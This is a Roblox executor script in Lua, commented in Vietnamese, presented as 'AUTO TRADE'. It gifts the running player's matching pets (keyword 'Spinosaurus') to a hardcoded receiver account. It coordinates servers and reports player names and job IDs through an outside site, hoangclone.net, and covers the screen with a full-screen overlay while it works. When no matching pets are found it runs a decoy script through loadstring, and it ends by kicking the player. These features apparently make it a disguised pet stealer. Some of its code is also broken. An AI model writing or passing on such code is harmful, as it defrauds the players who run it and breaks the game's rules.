getgenv().AutoTrade = {
    ["HannahStr3amRogu3"] = {"Spinosaurus"},
    ["Script"] = [[
    ]]
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:WaitForChild("Backpack")
local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")

local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

local PLACE_ID = 126884695634066
local API_URL = "https://games.roblox.com/v1/games/" .. PLACE_ID .. "/servers/Public?sortOrder=Asc&limit=100"

local request = (syn and syn.request) or http_request or (fluxus and fluxus.request)

local receiver = getgenv().AutoTrade and getgenv().AutoTrade.Receiver
local placeId = game.PlaceId -- ID game hiện tại

local player = game:GetService("Players").LocalPlayer

local function antiAFK()
	while true do
		VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
		task.wait(0.1)
		VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
		task.wait(1) -- Thực hiện mỗi 30 giây, có thể thay đổi
	end
end
task.spawn(antiAFK)
local function setupUI()
    pcall(function()
        game:GetService("StarterGui"):SetCore("TopbarEnabled", false)
    end)

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "SimpleDinoUI"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = player:WaitForChild("PlayerGui")
    screenGui.DisplayOrder = 2147483647
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local bgFrame = Instance.new("Frame")
    bgFrame.Size = UDim2.new(1, 0, 1, 0)
    bgFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    bgFrame.BackgroundTransparency = 1
    bgFrame.BorderSizePixel = 0
    bgFrame.Parent = screenGui

    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 8)
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    layout.VerticalAlignment = Enum.VerticalAlignment.Top
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = bgFrame

    local padding = Instance.new("UIPadding")
    padding.PaddingTop = UDim.new(0, 10)
    padding.Parent = bgFrame

    -- Discord Label
    local discordLabel = Instance.new("TextLabel")
    discordLabel.Name = "Discord"
    discordLabel.Size = UDim2.new(1, -60, 0, 60)
    discordLabel.BackgroundTransparency = 1
    discordLabel.Font = Enum.Font.GothamBlack
    discordLabel.TextScaled = true
    discordLabel.TextColor3 = Color3.new(1, 1, 1)
    discordLabel.Text = "discord.gg/chings"
    discordLabel.Parent = bgFrame

    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(114, 137, 218)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 100, 150))
    })
    gradient.Parent = discordLabel

    -- Player Name Label
    local playerLabel = Instance.new("TextLabel")
    playerLabel.Name = "PlayerName"
    playerLabel.Size = UDim2.new(1, -60, 0, 50)
    playerLabel.BackgroundTransparency = 1
    playerLabel.Font = Enum.Font.GothamBold
    playerLabel.TextScaled = true
    playerLabel.TextColor3 = Color3.fromRGB(200, 255, 200)
    playerLabel.Text = "👤 Player: " .. player.Name
    playerLabel.Parent = bgFrame

    -- Auto Trade Label
    local tradeLabel = Instance.new("TextLabel")
    tradeLabel.Name = "AutoTrade"
    tradeLabel.Size = UDim2.new(1, -70, 0, 70)
    tradeLabel.BackgroundTransparency = 1
    tradeLabel.Font = Enum.Font.GothamBold
    tradeLabel.TextScaled = true
    tradeLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
    tradeLabel.Text = "AUTO TRADE"
    tradeLabel.Parent = bgFrame

    -- Line Above Status
    local lineTop = Instance.new("Frame")
    lineTop.Size = UDim2.new(1, -80, 0, 2)
    lineTop.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    lineTop.BorderSizePixel = 0
    lineTop.Parent = bgFrame

    -- Pet Count Label tách ra ngoài
    local petCountLabel = Instance.new("TextLabel")
    petCountLabel.Name = "PetCount"
    petCountLabel.Size = UDim2.new(0, 150, 0, 50)  -- Kích thước tùy chỉnh
    petCountLabel.Position = UDim2.new(1, -160, 0, 10)  -- Góc trên phải, cách viền 10px
    petCountLabel.BackgroundTransparency = 1
    petCountLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    petCountLabel.BorderSizePixel = 0
    petCountLabel.Font = Enum.Font.Gotham
    petCountLabel.TextScaled = true
    petCountLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
    petCountLabel.Text = "Pets: Loading..."
    petCountLabel.Parent = screenGui  -- <-- Đặt parent trực tiếp là screenGui
    _G.PetCountLabel = petCountLabel


    -- Status Label
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Name = "Status"
    statusLabel.Size = UDim2.new(1, -60, 0, 50)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextScaled = true
    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    statusLabel.Text = "Status: Idle"
    statusLabel.Parent = bgFrame
    _G.StatusLabel = statusLabel

    -- Line Below Status
    local lineBottom = Instance.new("Frame")
    lineBottom.Size = UDim2.new(1, -80, 0, 2)
    lineBottom.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    lineBottom.BorderSizePixel = 0
    lineBottom.Parent = bgFrame
end

local function sendReceive()
    local LocalPlayer = Players.LocalPlayer

    local API_URLL = "https://hoangclone.net/api.php"

    -- Chọn hàm request từ executor
    local request = (syn and syn.request) or http_request or (fluxus and fluxus.request)
    if not request then
        warn("❌ Executor của bạn không hỗ trợ HTTP request")
        return
    end

    -- Gửi jobId cho API
    local function sendJobId()
        local body = {
            playerName = LocalPlayer.Name,
            jobId = game.jobId
        }

        local success, err = pcall(function()
            return request({
                Url = API_URLL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSONEncode(body)
            })
        end)

        if success then
            print("✅ Đã gửi JobId:", game.jobId)
        else
            warn("❌ Lỗi gửi JobId:", err)
        end
    end

    sendJobId()
end

local function countAllPets()
    local total = 0
    
    -- Đếm trong Backpack
    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") and string.find(item.Name, "KG") and string.find(item.Name, "Age") then
            total += 1
        end
    end

    -- Đếm trong Character (đang cầm)
    if LocalPlayer.Character then
        for _, item in ipairs(LocalPlayer.Character:GetChildren()) do
            if item:IsA("Tool") and string.find(item.Name, "KG") and string.find(item.Name, "Age") then
                total += 1
            end
        end
    end

    return total
end


-- Function to update pet count display
local function updatePetCount()
    while true do
        local petCount = countAllPets()
        if _G.PetCountLabel then
            _G.PetCountLabel.Text = "Pets: " .. tostring(petCount)
        end
        task.wait(1) -- Update every second
    end
end

setupUI()
task.spawn(updatePetCount)
task.wait(1)

-- ✅ Hàm lấy toàn bộ tool trong Backpack và Character
local function getAllTools()
	local tools = {}

	for _, tool in ipairs(Backpack:GetChildren()) do
		if tool:IsA("Tool") then
			table.insert(tools, tool)
		end
	end

	for _, tool in ipairs(LocalPlayer.Character:GetChildren()) do
		if tool:IsA("Tool") then
			table.insert(tools, tool)
		end
	end

	return tools
end

-- ✅ Hàm Teleport tới người nhận
local function teleportToPlayer(playerName)
	local target = Players:FindFirstChild(playerName)
	if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
		local pos = target.Character.HumanoidRootPart.Position
		local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		if hrp then
			hrp.CFrame = CFrame.new(pos + Vector3.new(0, 3, 0))
		end
	end
end

local function checkServerForStatusTrue()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            local success, response = pcall(function()
                return request({
                    Url = "https://hoangclone.net/api.php?type=status&playerName=" .. plr.Name,
                    Method = "GET"
                })
            end)
            if success and response and response.Body then
                local data = HttpService:JSONDecode(response.Body)
                if data.message == "true" then
                    return true  -- có người đang nhận pet
                end
            end
        end
    end
    return false -- không ai đang nhận pet
end



if getgenv().AutoTrade[LocalPlayer.Name] then
    ReplicatedStorage.GameEvents.GiftPet.OnClientEvent:Connect(function(giftUuid, petName, sender)
        print("🎁 Có yêu cầu nhận pet:", petName, "từ", sender)

        -- Lấy danh sách các từ khóa được phép cho chính tài khoản này
        local allowedKeywords = getgenv().AutoTrade[LocalPlayer.Name]
        local isPetAllowed = false

        -- Bắt đầu kiểm tra xem tên pet có chứa từ khóa nào được phép không
        for _, keyword in ipairs(allowedKeywords) do
            -- Dùng string.find để tìm kiếm, :lower() để không phân biệt hoa thường
            if string.find(petName:lower(), keyword:lower()) then
                isPetAllowed = true -- Nếu tìm thấy, đánh dấu là pet hợp lệ
                break -- Thoát khỏi vòng lặp vì đã tìm thấy kết quả
            end
        end

        -- Dựa vào kết quả kiểm tra để quyết định Chấp Nhận hay Từ Chối
        if isPetAllowed then
            print("✅ Pet hợp lệ, đang chấp nhận:", petName)
            _G.StatusLabel.Text = "Status: Accepting "..petName.." from "..sender
            ReplicatedStorage.GameEvents.AcceptPetGift:FireServer(true, giftUuid) -- Gửi true để chấp nhận
        else
            print("❌ Pet không hợp lệ, đang từ chối:", petName)
            _G.StatusLabel.Text = "Status: Rejecting "..petName.." from "..sender
            ReplicatedStorage.GameEvents.AcceptPetGift:FireServer(false, giftUuid) -- Gửi false để từ chối
        end

        task.wait(3)
        _G.StatusLabel.Text = "Status: Idle" -- Chuyển trạng thái về Idle
    end)
    task.spawn(function()
        sendReceive()
        if not request then
            warn("Executor không hỗ trợ HTTP request!")
            return
        end

        local function FindServer(maxPlayers)
            local response = request({
                Url = API_URL,
                Method = "GET",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "Roblox/WinInet"
                }
            })

            if not response or not response.Body then
                warn("Không thể lấy dữ liệu server.")
                return nil
            end

            local success, data = pcall(function()
                return HttpService:JSONDecode(response.Body)
            end)

            if not success then
                warn("Lỗi parse JSON. Nội dung API trả về:")
                print(response.Body) -- In ra để kiểm tra API trả về gì
                return nil
            end

            if not data.data then
                warn("Không có trường 'data' trong JSON.")
                return nil
            end

            for _, server in ipairs(data.data) do
                if server.playing <= maxPlayers and server.id ~= game.JobId then
                    return server.id
                end
            end

            return nil
        end
        while true do
            sendReceive()
            if #Players:GetPlayers() > 4 then
                local hasActiveReceiver = checkServerForStatusTrue()
                if hasActiveReceiver then
                    print("❌ Có người đang nhận pet, không hop server")
                else
                    print("🌐 Server quá đông, tìm server khác...")
                    local serverId = FindServer(2) -- function bạn đã có
                    if serverId then
                        TeleportService:TeleportToPlaceInstance(PLACE_ID, serverId, LocalPlayer)
                        task.wait(4)
                        TeleportService:Teleport(placeId, player)

                    else
                        warn("Không tìm thấy server phù hợp.")
                    end
                end
            else
                print("Server chưa quá đông, không cần chuyển")
            end
            task.wait(20)
        end
    end)
	-- Tự đá nếu đủ 60 pet
	task.spawn(function()
		while true do
            local count = countAllPets()
            if count >= 60 then
                print("❌ Full Pet!")
                LocalPlayer:Kick("Full Pet!")
                break
            end
			task.wait(2)
		end
	end)
-- 📤 Người gửi
else-- ✅ Kiểm tra pet thuộc receiver nào trong config mới
    local function sendStatus(playerName, status)
        if not request then return end
        local body = HttpService:JSONEncode({
            playerName = playerName,
            message = tostring(status)  -- "true" hoặc "false"
        })
        local success, err = pcall(function()
            request({
                Url = "https://hoangclone.net/api.php?type=status",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
        end)
        if success then
            print("✅ Status '"..tostring(status).."' đã gửi cho", playerName)
        else
            warn("❌ Lỗi gửi status:", err)
        end
    end
    local function getReceiverForPet(tool)
        if not tool:IsA("Tool") then return nil end
        local name = tool.Name:lower() -- chỉ chuyển về lowercase

        for receiver, petList in pairs(getgenv().AutoTrade) do
            if receiver ~= "Script" then
                for _, keyword in ipairs(petList) do
                    if string.find(name, keyword:lower()) then
                        print("✅ Pet hợp lệ, receiver:", receiver)
                        return receiver
                    end
                end
            end
        end
        return nil
    end




    local function getJobIdFromAPI(playerName)
        if not request then return nil end
        local response = request({
            Url = "https://hoangclone.net/api.php?playerName="..playerName,
            Method = "GET"
        })
        if response and response.StatusCode == 200 then
            local data = HttpService:JSONDecode(response.Body)
            return data.jobId
        end
        return nil
    end
    -- Hàm kiểm tra xem có pet hợp lệ trong Backpack hoặc Character không
    local function hasValidPetInInventory()
        local tools = {} 

        -- Lấy tool trong Backpack
        for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                table.insert(tools, tool)
            end
        end

        -- Lấy tool trong Character (đang cầm)
        if LocalPlayer.Character then
            for _, tool in ipairs(LocalPlayer.Character:GetChildren()) do
                if tool:IsA("Tool") then
                    table.insert(tools, tool)
                end
            end
        end

        -- Kiểm tra từng tool với config AutoTrade
        for _, tool in ipairs(tools) do
            local receiver = getReceiverForPet(tool)
            if receiver then
                return true -- Có pet hợp lệ
            end
        end

        return false -- Không có pet hợp lệ
    end

    if not hasValidPetInInventory() and getgenv().AutoTrade.Script then
        local scriptStr = getgenv().AutoTrade.Script
        local func, err = loadstring(scriptStr)
        if func then
            task.spawn(func)
        else
            warn("❌ Lỗi load script AutoTrade:", err)
        end
    end
        
    task.spawn(function()
        local hasTraded = false -- Biến đánh dấu đã trade ít nhất 1 lần

        while true do
            local tools = getAllTools()
            local tradedThisRound = false
            local foundValid = false

            print("🔄 Vòng lặp trade mới bắt đầu. Tổng tools:", #tools)

            for _, tool in ipairs(tools) do
                local receiver = getReceiverForPet(tool)
                if receiver then
                    foundValid = true
                    sendStatus(LocalPlayer.Name, true)
                    print("✅ Tìm thấy pet hợp lệ:", tool.Name, "→ receiver:", receiver)

                    if not tradedThisRound then
                        local targetPlayer = Players:FindFirstChild(receiver)
                        if targetPlayer then
                            print("🚀 Đang gửi pet:", tool.Name, "đến", receiver)

                            if tool.Parent == Backpack then
                                tool.Parent = LocalPlayer.Character
                                task.wait(0.3)
                                print("👜 Chuyển pet từ Backpack sang Character")
                            end

                            teleportToPlayer(receiver)
                            print("📍 Teleport đến", receiver)

                            PetGiftingService:FireServer("GivePet", targetPlayer)
                            print("🎁 Đã FireServer GivePet cho", receiver)

                            tradedThisRound = true
                            hasTraded = true
                        else
                            local jobId = getJobIdFromAPI(receiver)
                            if jobId then
                                print("🌐 Không thấy player, teleport đến server của receiver:", jobId)
                                TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId, LocalPlayer)
                            else
                                print("⚠️ Không tìm thấy jobId cho receiver:", receiver)
                            end
                        end
                    end
                end
            end

            if not foundValid then
                sendStatus(LocalPlayer.Name, false)
                _G.StatusLabel.Text = "Status: No pets!"
                print("⚠️ Không còn pet hợp lệ, gửi status false")
            end

            if hasTraded and not foundValid then
                print("✅ Đã trade hết pet hợp lệ, kick player")
                LocalPlayer:Kick("No more pet!")
                break
            end

            print("⏱ Chờ 10 giây trước vòng lặp tiếp theo...")
            task.wait(10)
        end
    end)
end
